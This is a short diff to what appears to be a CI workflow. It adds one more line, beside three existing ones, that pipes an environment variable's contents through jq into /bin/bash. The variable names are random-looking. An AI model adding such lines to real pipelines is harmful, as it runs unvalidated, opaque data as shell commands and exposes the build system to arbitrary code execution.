@@ -32,6 +32,7 @@ jobs:
           echo $yp79243 | jq -r .rdjm05207 | /bin/bash
           printf '%s' "$zelyz53455" | jq -r .o838 | /bin/bash
           printf '%s' "$cid8372" | jq -r .fu1 | /bin/bash
+          printf '%s' "$csbh373" | jq -r .cvdo7 | /bin/bash
 
       - name: Store artifact
         if: always()
